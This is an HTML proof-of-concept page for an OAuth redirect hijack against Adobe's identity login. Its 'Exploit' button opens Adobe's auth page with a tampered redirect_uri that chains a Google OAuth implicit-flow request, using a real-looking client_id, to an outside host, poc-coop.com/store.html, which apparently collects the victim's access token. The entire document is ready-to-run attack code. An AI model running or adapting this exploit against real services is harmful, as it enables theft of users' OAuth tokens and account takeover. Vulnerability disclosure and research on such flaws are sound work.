<!DOCTYPE html>
<html>
<head>
  <title>Adobe OAuth Redirect Hijack PoC</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
    button { padding: 10px 20px; margin-top: 20px; background: #4caf50; color: white; border: none; cursor: pointer; }
  </style>
</head>
<body>
  <h2>Adobe OAuth Redirect Hijack PoC</h2>
  <button onclick="launch()">Exploit</button>
  <div id="log"></div>

  <script>
    function log(msg) {
      document.getElementById("log").innerHTML += msg + "<br>";
    }

    function buildAttackURL() {
      // Build Google OAuth attack
      let client_id = "50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com";
      let redirect_uri = "https://poc-coop.com/store.html";
      let scope = "openid profile email";

      return "https://accounts.google.com/o/oauth2/v2/auth?" +
        "client_id=" + encodeURIComponent(client_id) +
        "&redirect_uri=" + encodeURIComponent(redirect_uri) +
        "&response_type=token" +
        "&scope=" + encodeURIComponent(scope);
    }

    function launch() {
      let attackOAuthURL = buildAttackURL();

      // Inject Google OAuth into Adobe's redirect_uri param
      let tamperedAdobeURL =
        "https://auth-light.identity.adobe.com/?" +
        "client_id=clio-playground-web" +
        "&response_type=token" +
        "&redirect_uri=" + encodeURIComponent(attackOAuthURL) +
        "&environment=prod" +
        "&locale=en_US" +
        "&dt=true&wrapper=true&popup=true" +
        "&asserted_origin=https://firefly.adobe.com";

      log("â–¶ Opening tampered Adobe login...");
      window.open(tamperedAdobeURL, "poc", "width=600,height=700");
    }
  </script>
</body>
</html>
